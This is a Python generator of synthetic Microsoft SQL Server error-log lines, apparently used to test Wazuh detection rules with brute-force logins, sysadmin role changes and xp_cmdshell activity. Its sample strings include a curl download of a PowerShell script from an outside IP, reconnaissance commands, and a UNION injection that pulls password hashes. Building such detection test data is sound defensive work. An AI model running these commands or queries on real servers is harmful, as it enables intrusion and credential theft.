"""
Microsoft SQL Server audit / error-log generator.

Wazuh ships generic decoders for MSSQL ERRORLOG. We produce realistic
ERRORLOG lines plus C2 (audit) entries triggering rules around:

  - Login failed for user (rule families 60123 + custom)
  - sa account use
  - sysadmin role membership change
  - xp_cmdshell execution attempts
"""
import random
from pathlib import Path
from datetime import timedelta
from .common import (
    USERNAMES, INTERNAL_IPS, ATTACKER_IPS,
    rand_recent, pick, maybe,
)

# MSSQL ERRORLOG uses local-time stamps:  "2026-05-11 10:30:45.12"
def _ts(ts):
    return ts.strftime("%Y-%m-%d %H:%M:%S.") + f"{ts.microsecond // 10000:02d}"


def _login_success(ts):
    user = pick(USERNAMES)
    ip = pick(INTERNAL_IPS)
    return (f"{_ts(ts)} Logon       Login succeeded for user '{user}'. "
            f"Connection made using SQL Server authentication. "
            f"[CLIENT: {ip}]")


def _login_failed(ts, attacker=False):
    user = "sa" if attacker else pick(USERNAMES)
    ip = pick(ATTACKER_IPS) if attacker else pick(INTERNAL_IPS)
    return (f"{_ts(ts)} Logon       Login failed for user '{user}'. "
            f"Reason: Password did not match that for the login provided. "
            f"[CLIENT: {ip}]")


def _login_failed_no_user(ts):
    return (f"{_ts(ts)} Logon       Login failed for user '{pick(USERNAMES)}'. "
            f"Reason: Could not find a login matching the name provided. "
            f"[CLIENT: {pick(ATTACKER_IPS)}]")


def _xp_cmdshell(ts):
    user = pick(["sa", "admin", "svc_sql"])
    cmd = pick([
        "whoami", "net user", "powershell -enc SQBFAFgA...",
        "curl http://185.220.101.45/x.ps1 -o c:\\temp\\x.ps1",
    ])
    return (f"{_ts(ts)} spid54      User '{user}' executed: "
            f"EXEC xp_cmdshell '{cmd}';")


def _role_change(ts):
    actor = "sa"
    target = pick(USERNAMES)
    return (f"{_ts(ts)} spid57      User '{actor}' added member '{target}' "
            f"to server role 'sysadmin'.")


def _backup(ts):
    db = pick(["HR_DB", "FINANCE", "CRM_PROD", "master"])
    return (f"{_ts(ts)} Backup      Database backed up. Database: {db}, "
            f"creation date(time): 2025-01-01(12:00:00), pages dumped: "
            f"{random.randint(1000, 50000)}, first LSN: 1234:5678:1, "
            f"last LSN: 1234:5678:2, full backup")


def _suspicious_query(ts):
    """Pattern often used in SQL injection / data exfiltration."""
    return (f"{_ts(ts)} spid61      Query executed by '{pick(USERNAMES)}': "
            f"SELECT * FROM users WHERE 1=1 UNION SELECT name, password_hash "
            f"FROM sys.sql_logins; -- ")


def generate(path: Path, count: int = 40) -> None:
    events = []

    # Baseline normal traffic
    for _ in range(count // 2):
        ts = rand_recent(60)
        events.append((ts, _login_success(ts)))
    for _ in range(5):
        ts = rand_recent(120)
        events.append((ts, _backup(ts)))

    # Brute force against 'sa' (15 rapid failures from one IP)
    base = rand_recent(20)
    for i in range(15):
        ts = base + timedelta(seconds=i * 2)
        events.append((ts, _login_failed(ts, attacker=True)))

    # A few scattered routine login failures
    for _ in range(4):
        ts = rand_recent(60)
        events.append((ts, _login_failed(ts, attacker=False)))
    for _ in range(2):
        ts = rand_recent(60)
        events.append((ts, _login_failed_no_user(ts)))

    # Suspicious activity
    ts = rand_recent(15); events.append((ts, _role_change(ts)))
    for _ in range(3):
        ts = rand_recent(15)
        events.append((ts, _xp_cmdshell(ts)))
    ts = rand_recent(15); events.append((ts, _suspicious_query(ts)))

    events.sort(key=lambda x: x[0])

    with path.open("w", encoding="utf-8") as f:
        for _, line in events:
            f.write(line + "\n")

    print(f"  wrote {len(events)} MSSQL events -> {path.name}")
